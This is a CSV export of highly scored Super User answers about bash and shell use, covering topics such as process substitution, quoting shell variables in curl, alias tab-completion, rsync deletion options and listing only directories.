Title,Id,Tags,Score,Body
"Looping Through Subdirectories and Running a Command in Each","44787","<linux><bash><shell><script>","51","<pre><code>for dir in ~/projects/git/*; do (cd ""$dir"" &amp;&amp; git pull); done
</code></pre>
"
"How to disable Bash on Windows notification sound effect","1108120","<windows-10><bash><windows-subsystem-for-linux><windows-10-v1607>","51","<p>The <a href=""https://superuser.com/a/1108171/232984"">answer</a> given by <a href=""https://superuser.com/users/168043/wouter"">Wouter</a> works better overall once set up, but it can be slightly confusing to get working as the correct option doesn't always appear. Follow these steps:</p>

<ul>
<li>Right click the volume control in the Windows taskbar</li>
<li>Open the Volume Mixer</li>
<li>Open the Bash on Windows console</li>
<li>Do something to trigger the console making the notification sound (e.g. press backspace on an empty line). If you've disabled the notification using the alternative method below, you'll have to undo it.</li>
<li>Now a <strong>Console Window Host</strong> option should have appeared in the Volume Mixer (you might have to scroll right)</li>
<li>Mute its sound setting</li>
</ul>

<p><a href=""https://i.stack.imgur.com/aKIda.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/aKIda.jpg"" alt=""Volume mixer with Console Window Hos""></a></p>

<h2>Previous/alternative method</h2>

<p>You can simply run the following command from within your Windows Bash shell [<a href=""https://github.com/Microsoft/BashOnWindows/issues/715"" rel=""noreferrer"">source</a>]:</p>

<pre><code>echo ""set bell-style none"" &gt;&gt; ~/.inputrc
</code></pre>

<p>or else edit <code>.inputrc</code> manually with a text-editor to add <code>set bell-style none</code> on it's own line.</p>

<p>You'll need to restart your currently open bash shell before it takes affect.</p>

<p>This will only work for your current user, and won't help if you ssh into other accounts (unless you run that command again for each account).</p>
"
"How can I get the scp command to overwrite the destination folder","649186","<bash><ssh><scp>","51","<p>Like Levans, I have been unable to replicate this, but have you considered using rsync over ssh instead?  If you're copying large numbers of files, rsync may be a better option than scp.  There are a number of good guides to it online, such as these:</p>

<p><a href=""http://troy.jdmz.net/rsync/index.html"" rel=""noreferrer"">http://troy.jdmz.net/rsync/index.html</a>
<a href=""https://calomel.org/rsync_tips.html"" rel=""noreferrer"">https://calomel.org/rsync_tips.html</a></p>

<p>That first link deals with automated backups via cron, so some of the instructions (like creating an ssh key without a passphrase) may not be relevant to you.</p>
"
"Using the Terminal keybindings with bash on macOS","124336","<macos><bash><keyboard-shortcuts><terminal.app>","50","<p>One way to deal with 'meta' key sequences not working on the OS X terminal is to assign specific character sequences to particular keypresses. For those of us with non-US keyboards, this is often a better solution than the ""Use option as meta"" setting mentioned in the comments of other answers. (Many international Mac keyboards are essentially unusable for development work without the Option/alt key because certain critical characters are otherwise unavailable. There's no <kbd>#</kbd> on a UK Mac keyboard, for example.)</p>

<p>To get word-left and word-right working for bash, I've used the ""Keyboard"" section of the Settings in Terminal. You can tell it to generate particular code sequences when particular keypresses are made. I've got mine configured so that <kbd>alt</kbd>+<kbd>◀</kbd> generates <code>\033b</code> (that's actually two characters: Esc, and then a lowercase b) and <kbd>alt</kbd>+<kbd>▶</kbd> generates <code>\033f</code> (i.e., <code>Esc f</code>). This lets you use the arrow keys with the option key held down to get the word left and right behaviour.</p>

<p>What I've not yet worked out is how to get the <kbd>Esc</kbd> key to work - in theory you should be able to use that for 'meta' sequences but it appears not to work. (So just typing <kbd>Esc</kbd>+<kbd>b</kbd> should go back one word.)</p>

<p>If you have a US keyboard layout, or some other keyboard in which Apple have seen fit to provide all the keys you actually need, then as others have suggested, ""Use option as meta key"" (also on the Keyboard section of Terminal's settings) is probably a better choice because you'll be able to get to any meta key combination. With that switched on, <kbd>Alt</kbd>+<kbd>b</kbd> works as expected.</p>
"
"What exactly is <() in bash (and =() in zsh)?","1059781","<linux><bash><shell><zsh>","50","<p>This is called process substitution.</p>

<p>The <code>&lt;(list)</code> syntax is supported by both, <a href=""https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution"" rel=""noreferrer""><code>bash</code></a> and <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#Process-Substitution"" rel=""noreferrer""><code>zsh</code></a>. It provides a way to pass the output of a command (<code>list</code>) to another command when using a pipe (<code>|</code>) is not possible. For example when a command just does not support input from <code>STDIN</code> or you need the output of multiple commands: </p>

<pre><code>diff &lt;(ls dirA) &lt;(ls dirB)
</code></pre>

<hr>

<p><code>&lt;(list)</code> connects the output of <code>list</code> with a file in <code>/dev/fd</code>, if supported by the system, otherwise a named pipe (FIFO) is used (which also depends on support by the system; neither manual says what happens if both mechanisms are not supported, presumably it aborts with an error). The name of the file is then passed as argument on the command line.</p>

<hr>

<p><code>zsh</code> additionally supports <code>=(list)</code> as possible replacement for <code>&lt;(list)</code>. With <code>=(list)</code> a temporary file is used instead of file in <code>/dev/fd</code> or a FIFO. It can be used as a replacement for <code>&lt;(list)</code> if the program needs to lseek in the output.</p>

<p>According to the <a href=""http://zsh.sourceforge.net/Doc/Release/Expansion.html#Process-Substitution"" rel=""noreferrer"">ZSH manual</a> there might also be other issues with how <code>&lt;(list)</code> works:</p>

<blockquote>
  <p>The <code>=</code> form is useful as both the <code>/dev/fd</code> and the named pipe implementation of <code>&lt;(...)</code> have drawbacks. In the former case, some programmes may automatically close the file descriptor in question before examining the file on the command line, particularly if this is necessary for security reasons such as when the programme is running setuid. In the second case, if the programme does not actually open the file, the subshell attempting to read from or write to the pipe will (in a typical implementation, different operating systems may have different behaviour) block for ever and have to be killed explicitly. In both cases, the shell actually supplies the information using a pipe, so that programmes that expect to lseek (see man page <code>lseek(2)</code>) on the file will not work.</p>
</blockquote>
"
"Can I save these documents on a dying machine from oblivion?","1268868","<linux><bash><ssd><fedora><crash>","50","<p>here's an example libasound program with just enough definitions to get basic 2-channel 44.1k wav output going without the headers.</p>

<p>EDIT: I'm actually not sure if straight up dumping the data as wav would work, as noise when recording could easily damage it, but you can probably do something like a sine wave of bits at high frequency which is more reliable</p>

<p>EDIT2: if aplay is present and works you can also use that and just write a program that output raw audio and pipe it into aplay or anything that can play audio</p>

<p>EDIT3: modified it to not use any headers at all</p>

<p>if -lasound doesn't compile, add -L/path/where/libasound/is/located</p>

<pre><code>/*
    gcc alsa_noheader.c -lasound
    cat stuff.wav | ./a.out
*/

typedef unsigned int uint;
typedef unsigned long ulon;

int printf(char*, ...);
void* malloc(long);
long read(int fd, void* buf, ulon count);

int snd_pcm_open(void**, char*, int, int);
ulon snd_pcm_hw_params_sizeof();
int snd_pcm_hw_params_any(void*, void*);
int snd_pcm_hw_params_set_access(void*, void*, int);
int snd_pcm_hw_params_set_format(void*, void*, int);
int snd_pcm_hw_params_set_channels(void*, void*, uint);
int snd_pcm_hw_params_set_rate_near(void*, void*, uint*, int*);
int snd_pcm_hw_params(void*, void*);
int snd_pcm_hw_params_get_period_size(void*, ulon*, int*);
long snd_pcm_writei(void*, void*, uint);
int snd_pcm_prepare(void*);
int snd_pcm_drain(void*);
int snd_pcm_close(void*);

int main(int argc, char* argv[])
{
    void* pcm;
    void* params;

    int rate;
    int nchannels;
    ulon frames;
    void* buf;
    int bufsize;
    long nread;

    snd_pcm_open(&amp;pcm, ""default"", 0, 0);
    params = malloc(snd_pcm_hw_params_sizeof());
    snd_pcm_hw_params_any(pcm, params);

    /* 3 = rw_interleaved */
    snd_pcm_hw_params_set_access(pcm, params, 3);

    /* 2 = 16-bit signed little endian */
    snd_pcm_hw_params_set_format(pcm, params, 2);

    /* 2 channels */
    nchannels = 2;
    snd_pcm_hw_params_set_channels(pcm, params, nchannels);

    /* sample rate */
    rate = 44100;
    snd_pcm_hw_params_set_rate_near(pcm, params, &amp;rate, 0);

    snd_pcm_hw_params(pcm, params);
    snd_pcm_hw_params_get_period_size(params, &amp;frames, 0);

    bufsize = frames * nchannels * 2;
    buf = malloc(bufsize);

    /* read file from stdin */
    while (nread = read(0, buf, bufsize) &gt; 0)
    {
        if (snd_pcm_writei(pcm, buf, frames) == -29)
        {
            printf(""W: underrun\n"");
            snd_pcm_prepare(pcm);
        }
    }

    snd_pcm_drain(pcm);
    snd_pcm_close(pcm);

    return 0;
}
</code></pre>
"
"How to include environment variable in bash line CURL?","835587","<bash><environment-variables>","50","<p>Inside single-quotes, the shell expands nothing.  Place them inside double-quotes instead:</p>

<pre><code>curl -u &lt;my-api-token&gt;: \
  -X POST https://api.pushbullet.com/v2/pushes \
  --header 'Content-Type: application/json' \
  --data-binary '{""type"": ""note"", ""title"": ""'""$TR_TORRENT_NAME""'"", \
  ""body"": ""'""$TR_TORRENT_NAME completed""'.""}'
</code></pre>

<p>Let's examine how this works by looking at:</p>

<pre><code>$ TR_TORRENT_NAME=MyTorrent
$ echo '{""type"": ""note"", ""title"": ""'""$TR_TORRENT_NAME""'"", ""body"": ""'""$TR_TORRENT_NAME completed""'.""}'
{""type"": ""note"", ""title"": ""MyTorrent"", ""body"": ""MyTorrent completed.""}
</code></pre>

<p>When the shell variable appears, it is always inside double-quotes. Consequently, it is properly expanded.</p>

<p>Quoting like this is a bit subtle.  We have single-quoted strings that contain double-quotes as characters and are next to double-quoted strings.  To understand this better, let's take this fragment as a an example:</p>

<pre><code> ""'""$TR_TORRENT_NAME""'""
</code></pre>

<p>Taking each character in turn:</p>

<ol>
<li><p><code>""</code> is a literal double-quote character that is inside of a single-quoted string. (For brevity, the beginning of this string is not shown in this fragment.)</p></li>
<li><p><code>'</code> closes a single-quoted string.</p></li>
<li><p><code>""</code> opens a double-quoted string.</p></li>
<li><p><code>$TR_TORRENT_NAME</code> is a shell variable that is expanded inside double-quotes.</p></li>
<li><p><code>""</code> closes the double-quoted string.</p></li>
<li><p><code>'</code> opens a new single-quoted string.</p></li>
<li><p><code>""</code> places a double-quote character inside the single-quoted string.</p></li>
</ol>
"
"How can I get bash to perform tab-completion for my aliases?","436314","<bash><tab-completion>","49","<p>The following code, adapted from <a href=""https://stackoverflow.com/a/1793178/990363"">this Stack Overflow answer</a> and this <a href=""http://ubuntuforums.org/showthread.php?t=733397"" rel=""noreferrer"">Ubuntu Forums discussion thread</a> will add completions for all your defined aliases:</p>

<pre><code># Automatically add completion for all aliases to commands having completion functions
function alias_completion {
    local namespace=""alias_completion""

    # parse function based completion definitions, where capture group 2 =&gt; function and 3 =&gt; trigger
    local compl_regex='complete( +[^ ]+)* -F ([^ ]+) (""[^""]+""|[^ ]+)'
    # parse alias definitions, where capture group 1 =&gt; trigger, 2 =&gt; command, 3 =&gt; command arguments
    local alias_regex=""alias ([^=]+)='(\""[^\""]+\""|[^ ]+)(( +[^ ]+)*)'""

    # create array of function completion triggers, keeping multi-word triggers together
    eval ""local completions=($(complete -p | sed -Ene ""/$compl_regex/s//'\3'/p""))""
    (( ${#completions[@]} == 0 )) &amp;&amp; return 0

    # create temporary file for wrapper functions and completions
    rm -f ""/tmp/${namespace}-*.tmp"" # preliminary cleanup
    local tmp_file; tmp_file=""$(mktemp ""/tmp/${namespace}-${RANDOM}XXX.tmp"")"" || return 1

    local completion_loader; completion_loader=""$(complete -p -D 2&gt;/dev/null | sed -Ene 's/.* -F ([^ ]*).*/\1/p')""

    # read in ""&lt;alias&gt; '&lt;aliased command&gt;' '&lt;command args&gt;'"" lines from defined aliases
    local line; while read line; do
        eval ""local alias_tokens; alias_tokens=($line)"" 2&gt;/dev/null || continue # some alias arg patterns cause an eval parse error
        local alias_name=""${alias_tokens[0]}"" alias_cmd=""${alias_tokens[1]}"" alias_args=""${alias_tokens[2]# }""

        # skip aliases to pipes, boolean control structures and other command lists
        # (leveraging that eval errs out if $alias_args contains unquoted shell metacharacters)
        eval ""local alias_arg_words; alias_arg_words=($alias_args)"" 2&gt;/dev/null || continue
        # avoid expanding wildcards
        read -a alias_arg_words &lt;&lt;&lt; ""$alias_args""

        # skip alias if there is no completion function triggered by the aliased command
        if [[ ! "" ${completions[*]} "" =~ "" $alias_cmd "" ]]; then
            if [[ -n ""$completion_loader"" ]]; then
                # force loading of completions for the aliased command
                eval ""$completion_loader $alias_cmd""
                # 124 means completion loader was successful
                [[ $? -eq 124 ]] || continue
                completions+=($alias_cmd)
            else
                continue
            fi
        fi
        local new_completion=""$(complete -p ""$alias_cmd"")""

        # create a wrapper inserting the alias arguments if any
        if [[ -n $alias_args ]]; then
            local compl_func=""${new_completion/#* -F /}""; compl_func=""${compl_func%% *}""
            # avoid recursive call loops by ignoring our own functions
            if [[ ""${compl_func#_$namespace::}"" == $compl_func ]]; then
                local compl_wrapper=""_${namespace}::${alias_name}""
                    echo ""function $compl_wrapper {
                        (( COMP_CWORD += ${#alias_arg_words[@]} ))
                        COMP_WORDS=($alias_cmd $alias_args \${COMP_WORDS[@]:1})
                        (( COMP_POINT -= \${#COMP_LINE} ))
                        COMP_LINE=\${COMP_LINE/$alias_name/$alias_cmd $alias_args}
                        (( COMP_POINT += \${#COMP_LINE} ))
                        $compl_func
                    }"" &gt;&gt; ""$tmp_file""
                    new_completion=""${new_completion/ -F $compl_func / -F $compl_wrapper }""
            fi
        fi

        # replace completion trigger by alias
        new_completion=""${new_completion% *} $alias_name""
        echo ""$new_completion"" &gt;&gt; ""$tmp_file""
    done &lt; &lt;(alias -p | sed -Ene ""s/$alias_regex/\1 '\2' '\3'/p"")
    source ""$tmp_file"" &amp;&amp; rm -f ""$tmp_file""
}; alias_completion
</code></pre>

<p>For simple (command only, no arguments) aliases it will assign the original completion function to the alias; for aliases with arguments, it creates a wrapper function that inserts the extra arguments into the original completion function.</p>

<p>Unlike the scripts it has evolved from, the function respects quotes both for the alias command and its arguments (but the former have to be matched by the completion command, and cannot be nested), and it should reliably filter out aliases to <em>command lists</em> and <em>pipes</em> (which are skipped, as it is impossible to find out what to complete in them without re-creating the complete shell command line parsing logic).</p>

<h2>Usage</h2>

<p>Either save the code as a shell script file and <a href=""http://mywiki.wooledge.org/BashGuide/Sourcing"" rel=""noreferrer"">source</a> that in, or copy the function wholesale into, <code>.bashrc</code> (or your <a href=""http://mywiki.wooledge.org/DotFiles"" rel=""noreferrer"">pertinent dot file</a>). The important thing is to call the function <strong>after both bash completion and alias definitions have been set up</strong> (the code above calls the function right after its definition, in a “source and forget” spirit, but you can move the call anywhere downstream if that suits you better). If you don’t want the function in your environment after it exits, you can add <code>unset -f alias_completion</code> after calling it.</p>

<h2>Notes</h2>

<p>If you are using <code>bash</code> 4.1 or above and use dynamically-loaded completions, the script will attempt to load completions for all of your aliased commands so that it can build the wrapper functions for your aliases.</p>
"
"What do those +/- mean if linux job in background finishes (started with &)","559211","<linux><bash>","49","<p>From <code>man bash</code>:</p>

<blockquote>
  <p>In output pertaining to jobs (e.g., the output of the <code>jobs</code> command), the current job is always flagged with a <code>+</code>, and the previous job with a <code>-</code>.</p>
</blockquote>

<p>That is, the job flagged with a <code>+</code> is the one that was sent to the background last. </p>

<p>It is also the one that will be brought into the foreground when <code>fg</code> is used without arguments:</p>

<pre><code>$ /tmp/script &amp;
[1] 9871
$ /tmp/script2 &amp;
[2] 9876
$ /tmp/script3 &amp;
[3] 9881
$ /tmp/script4 &amp;
[4] 9886
$ jobs
[1]   Running                 /tmp/script &amp;
[2]   Running                 /tmp/script2 &amp;
[3]-  Running                 /tmp/script3 &amp;
[4]+  Running                 /tmp/script4 &amp;
$ fg
/tmp/script4
</code></pre>

<p>The job flagged with a <code>-</code> was sent to the background second last. Other background jobs are not flagged.</p>
"
"Does rsync delete files, folders at destination by default?","730654","<macos><bash><unix><rsync>","49","<p>By default, rsync does not delete files but that depends on the commands options you specify. You can use any the following if you WANT to delete files:</p>

<ul>
<li>−−del (alias for −−delete−during)</li>
<li>−−delete (deletes extraneous files from dest dirs)</li>
<li>−−delete−before (receiver deletes before xfer [default])</li>
<li>−−delete−during (receiver deletes during xfer, not before)</li>
<li>−−delete−after (receiver deletes after xfer, not before) </li>
<li>−−delete−excluded (also delete excluded files from dest dirs) </li>
<li>−−max−delete=NUM (don’t delete more than NUM files)</li>
</ul>

<p>Since you specifically called out the <strong>-a</strong> option, here's what the man page says</p>

<blockquote>
  <p><strong><em>−a, −−archive</em></strong>
  ></p>
  
  <blockquote>
    <p>This is equivalent to <strong>−rlptgoD</strong>. It is a quick way of saying you want recursion and want to preserve almost everything (with −H being a notable omission). The only exception to the above equivalence is when <strong>−−files−from</strong> is specified, in which case −r is not implied.</p>
    
    <p>Note that <strong>−a does not preserve hardlinks</strong>, because finding multiply-linked files is expensive. You must separately specify <strong>−H</strong>.</p>
  </blockquote>
</blockquote>

<p>So it seems the answer to your question is NO, it won't be deleted given your examples.<br>
HTH</p>
"
"How can I prepend a line number and tab to each line of a text file?","10201","<unix><bash>","49","<pre><code>awk '{printf ""%d\t%s\n"", NR, $0}' &lt; filename
</code></pre>
"
"I want to change DPI with ImageMagick without changing the actual byte-size of the image data","479197","<linux><bash><image-processing><imagemagick><gimp>","48","<p>Specify the units - I seem to remember having a problem when I omitted this option (although DPI should be the default), for example:</p>

<pre><code>convert -units PixelsPerInch input.png -density 300 output.png
</code></pre>

<p>Do you know which embedded data fields GIMP uses to read the resolution - does it have its own that override the standard ones used by ImageMagick? For example, Photoshop uses <code>Photoshop:XResolution</code> and <code>Photoshop:YResolution</code> so you have to set these for Photoshop to recognise a density setting (ImageMagick can’t do this - we use ExifTool).</p>
"
"What does this strange symbol "":>"" in bash mean","965870","<bash>","48","<h3>There was :> in a line of a bash script. What does it mean?</h3>

<pre><code>:&gt; file
</code></pre>

<p>It is a short cut way of saying:</p>

<ul>
<li>If <code>file</code> does not exist then create it else truncate it to <code>0</code> bytes.</li>
</ul>

<p>This means you can be sure that <code>file</code> exists and it is empty.</p>

<p>You can also use <code>&gt; file</code> but <code>:&gt; file</code> is more portable.</p>

<p>See the Stack Overflow question <a href=""https://stackoverflow.com/questions/3224878/what-is-the-purpose-of-the-colon-gnu-bash-builtin"">What Is the Purpose of the ':' (colon) GNU Bash Builtin?</a> for more information.</p>
"
"How can I ""grep"" recursively filtering the name of the files I want with wildcards?","757834","<linux><command-line><bash><grep><file-filter>","48","<p>Use <code>grep</code>'s <code>--include</code> option:</p>

<pre><code>grep -ir ""string"" --include=""*.php"" .
</code></pre>
"
"Killing all instances of Chrome on the command-line?","131019","<linux><google-chrome><bash>","47","<p>Try using <strong><a href=""http://linux.die.net/man/1/pkill"">pkill(1)</a></strong>.</p>

<p><code>pkill chrome</code></p>
"
"Have a file named ~ (tilde) in my home-directory","609362","<linux><bash><filesystems>","47","<p>The pretty much ultimate solution when it comes to files that can't be deleted by normal means:</p>

<pre><code>ls -il 
</code></pre>

<p>The first column will show the inode number of the files.</p>

<pre><code>find . -inum [inode-number] -exec rm -i {} \;
</code></pre>

<p>This will delete the file with the specified inode-number after verification.</p>
"
"Bash completion for commands in Mac OS X","288438","<macos><command-line><bash><macports><fink>","46","<p><a href=""http://bash-completion.alioth.debian.org"" rel=""noreferrer"">bash-completion</a> adds completion for:</p>

<ul>
<li>Command names after <code>sudo</code> and <code>which</code></li>
<li>Macports and Homebrew package names (optional)</li>
<li>Hostnames in <code>known_hosts</code> for commands like <code>ssh</code></li>
<li>Folders on <code>CDPATH</code></li>
</ul>

<p>And so on. You can print a list of completion commands with <code>complete -p</code> and see the source of a function with <code>declare -f</code>.</p>

<h3>Installing Homebrew or MacPorts and Bash</h3>

<p>First, you have to install <a href=""http://brew.sh/"" rel=""noreferrer"">Homebrew</a> or <a href=""https://www.macports.org/"" rel=""noreferrer"">MacPorts</a> according to the instructions. <strong>Note:</strong> Do not install both, as they conflict.</p>

<p>Then, install a newer version of Bash. The built-in Bash in OS X is a little old, and you'll get more completion options with Bash > 4.1, which you can get through</p>

<pre><code>brew install bash
</code></pre>

<p>or</p>

<pre><code>sudo port install bash
</code></pre>

<p>depending on whether you use Homebrew or MacPorts.</p>

<h3>Installing bash-completion with Homebrew</h3>

<p>To install <code>bash-completion</code>, you have to:</p>

<pre><code>brew install bash-completion
</code></pre>

<p>And add the following to your <code>~/.bash_profile</code>:</p>

<pre class=""lang-bsh prettyprint-override""><code>if [ -f $(brew --prefix)/etc/bash_completion ]; then
  . $(brew --prefix)/etc/bash_completion
fi
</code></pre>

<p>Homebrew currently installs an older version of bash-completion (1.3) that still works with Bash 3.x, but still, using Bash 4.x is recommended.</p>

<h3>Installing bash-completion with MacPorts</h3>

<p>With MacPorts:</p>

<pre><code>sudo port install bash-completion
</code></pre>

<p>Then, add to your <code>~/.bash_profile</code>:</p>

<pre><code>if [ -f /opt/local/etc/profile.d/bash_completion.sh ]; then
  . /opt/local/etc/profile.d/bash_completion.sh
fi
</code></pre>

<p>See <a href=""http://trac.macports.org/wiki/howto/bash-completion"" rel=""noreferrer"">trac.macports.org/wiki/howto/bash-completion</a> for instructions on how to enable completion for port names.</p>
"
"Bash autocomplete on symlink to directory complete to whole directory, including slash","271626","<bash><autocomplete>","46","<p>Enable the <code>mark-symlinked-directories</code> option for <em>readline</em>.</p>

<ol>
<li><p>Edit <code>~/.inputrc</code>:</p>

<pre><code>$include /etc/inputrc
set mark-symlinked-directories on
</code></pre></li>
<li><p>Press <kbd>C-x</kbd>, <kbd>C-r</kbd> to reload the settings.</p></li>
</ol>

<p>See section <em>READLINE</em> in the manual page of <code>bash</code> for further documentation.</p>

<p>For those who do not wish to add another dot file, you can also add this line to your <code>~/.bashrc</code>:</p>

<pre><code>bind 'set mark-symlinked-directories on'
</code></pre>
"
"Can't rename a file the name of which starts with a hyphen","510337","<linux><command-line><bash><shell>","46","<p>Most GNU/Linux commands allow a <code>--</code> option to indicate end of options so that subsequent <code>-</code> prefixed words are not treated as options.</p>

<pre><code>  mv -- -example-file-name example-file-name
</code></pre>

<p>A small test</p>

<pre><code>$ touch -- -example
$ ls -l -- *ample
-rw-r--r-- 1 rgb rgb 0 Nov 25 09:57 -example
$ mv -- -example example
$
</code></pre>
"
"echo text with new line in bash","154936","<linux><bash>","45","<p>option 1:</p>

<pre><code>% echo -e ""text\n"" &gt;&gt; file.conf
</code></pre>

<p>option 2:</p>

<pre><code>% ( echo text ; echo """" ) &gt;&gt; file.conf
</code></pre>

<p>option 3:</p>

<pre><code>% echo text &gt;&gt; file.conf
% echo """"  &gt;&gt; file.conf
</code></pre>
"
"how to get elements from list in bash?","121627","<linux><bash>","45","<p>no spaces between equal sign</p>

<pre><code>$ List=""abcd 1234 jvm something""
$ set -- $List
$ echo $2
1234
</code></pre>

<p>Some other ways, although not as efficient as using shell's internals</p>

<pre><code>$ echo $List | cut -d"" "" -f2
1234
$  echo $List | awk '{print $2}'
1234
$ echo $List | sed 's/^.[^ \t]* //;s/ .*//'
1234
$ echo $List | tr "" "" ""\n""|sed -n '2p'
1234
</code></pre>
"
"Bash vs. Gnu screen : Replace Ctrl-A with Ctrl-Shift-A","142680","<bash><gnu-screen><readline>","45","<p>The problem with <kbd>Control</kbd>-<kbd>Shift</kbd>-<kbd>A</kbd> is that most terminal emulation programs do not send a different code for it from the one sent by <kbd>Control</kbd>-<kbd>A</kbd>, so there would be no way for <em>screen</em> to tell the difference.</p>

<p>You might be able to use C-q if you do <code>stty -ixon</code> to disable “software flow control” on the tty. I usually do this so I can use C-s to search on the command line.</p>

<p>You might consider C-^, since it seems to be usually unbound. It is <kbd>Control</kbd>-<kbd>Shift</kbd>-<kbd>6</kbd> on US keyboard layouts, but it may be difficult to type on other layouts.</p>

<p>Most people never use the tty control character C-\ to send SIGQUIT. To use it, disable the tty functionality with with <code>stty quit undef</code> and bind it as your prefix key. This is a bit risky though, since if you hit C-\ on a tty where the quit key has not been disabled with <em>stty</em>, you might kill the foreground process instead of activating <em>screen</em>.</p>

<p>I switched to <a href=""http://tmux.sourceforge.net/"" rel=""nofollow noreferrer""><em>tmux</em></a> a while ago. Its default is C-b <a href=""http://sourceforge.net/mailarchive/message.php?msg_name=20100429195120.GA17144%40yelena.nicm.ath.cx"" rel=""nofollow noreferrer"">because it was developed under <em>screen</em> and did not interfere with <em>screen</em>'s default</a>. I have found that C-b works fairly well for me (I usually use the arrow keys for single character movement on the shell command line—though I use M-b and M-f to move by words).</p>

<p>Incidentally, the author of <em>tmux</em> uses C-a in his primary sessions and <a href=""http://sourceforge.net/mailarchive/message.php?msg_name=20100429201207.GD15766%40yelena.nicm.ath.cx"" rel=""nofollow noreferrer"">always types C-a twice</a> (whether in a <em>tmux</em> session or not). If you are willing to adopt this habit, it seems like a decent compromise since the second C-a should be a no-op in most Emacs-like editing contexts. It would not work so will if you often use programs/contexts outside of <em>screen</em> where the second C-a would not be a no-op.</p>

<p>By default, C-a C-a is bound to the <em>other</em> command (switch to most recently active screen) in <em>screen</em>. To have C-a C-a send an actual C-a and have C-a o switch windows, put the following in your <code>.screenrc</code>:</p>

<pre><code>escape ^A^A
bind o other
</code></pre>
"
"How to quickly change the first word in a Bash command?","867904","<linux><command-line><bash><shell>","45","<p><code>!$</code> expands to the last word of your previous command.</p>

<p>So you could do:</p>

<pre><code>cat foo/is/a/very/long/path/to/bar.c

rm !$
</code></pre>

<p>or:</p>

<pre><code>git diff foo/bar.c

git checkout !$
</code></pre>

<p>Your examples happened to only repeat the last word, so <code>!$</code> worked fine. If you actually had a lot of arguments that you wanted to repeat, and you just wanted to change the first word, you could use <code>!*</code>, which expands to all words of the previous command except the zeroth. </p>

<p>See the ""HISTORY EXPANSION"" section of the <code>bash</code> man page. There's a lot of flexibility there.</p>
"
"Finding the definition of a bash function","144772","<bash><shell>","44","<p>To get the function definition:</p>

<pre><code>type -a function_name
</code></pre>
"
"The command 'ls -d' is not displaying directories. Is there a way to get 'ls' to only display directories instead of files and directories?","344877","<linux><bash><ls>","44","<p>Your expectations are based upon DOS Think/Windows Think and are wrong.  On MS-DOS, Windows, and indeed a few other IBM/Microsoft operating systems, wildcard expansion is done by the command itself, and things like the <code>/a</code> option to the <code>dir</code> command act as attribute filters during wildcard expansion.  <code>dir</code> expands wildcards like <code>*</code>, which the command interpreter passes to it as-is, and if <code>/a</code> is specified it applies the appropriate filters to what is returned.  (On some operating systems, the attribute filters can be given to the system call for enumerating a directory and the operating system kernel, or its filesystem drivers, applies them itself.)</p>

<p>On Unices and on Linux, wildcard expansion is done by the shell, and is oblivious to permissions.  When, in the root directory, you do <pre>ls *</pre><p>what the <code>ls</code> command itself <em>receives</em> from the shell is (something like) <pre>ls bin home opt var boot dev tmp etc lost+found root usr</pre><p>What the <code>-d</code>/<code>--directory</code> option does is <em>turn off what normally happens next</em>.  What normally happens next is that <code>ls</code> looks at each of its arguments in turn, sees that they are directories, and decides to enumerate their contents.  For arguments that name files, it just prints out the information for the file itself.  With the <code>-d</code> option, directories are treated just like files.  So <code>ls</code> prints out the information for each of the directories that is passed as its arguments, just as it would do if they were files.</p>

<p>So <code>-d</code> <strong>is not</strong> a ""print only directories"" option.  In fact, not only is there no such option; there <em>cannot be</em> such an option.  Wildcard expansion is done by the shell, and (in a POSIX <code>sh</code> at least) there's no way to tell the shell to check permission and file type bits when it expands <code>*</code> into a list of names.  To obtain a list of the names of directories alone, it is necessary either to use the <code>find</code> command, as explained by <code>ztank1013</code>, or to use the trick that a pathname ending with a slash implies the directory entry <code>.</code>, as explained by <code>Jin</code>.  (<code>Jin</code>'s trick ends up with the <code>ls</code> command receiving the arguments  <pre>ls bin/ home/ opt/ var/ boot/ dev/ tmp/ etc/ lost+found/ root/ usr/</pre><p>because the pattern <code>*/</code> is in fact matching pathnames with two components, the second being empty, and so isn't <em>quite</em> doing what was desired.  In particular, it will treat symbolic links pointing to directories as if they were directories.)</p>

<p>The behaviour of <code>ls -d</code> without a <code>*</code> is a simple extension of the above.  One simply has to know one more thing about <code>ls</code>: When it is given no arguments, it assumes a default argument of <code>.</code>.  Now <em>without</em> the <code>-d</code> option, the aforementioned behaviour leads to the contents of the directory named by <code>.</code> being enumerated and the information for its contents displayed.  <em>With</em> the <code>-d</code> option, the directory <code>.</code> is treated just as if it were a file, and its own information is displayed, rather than its contents enumerated.</p>
"
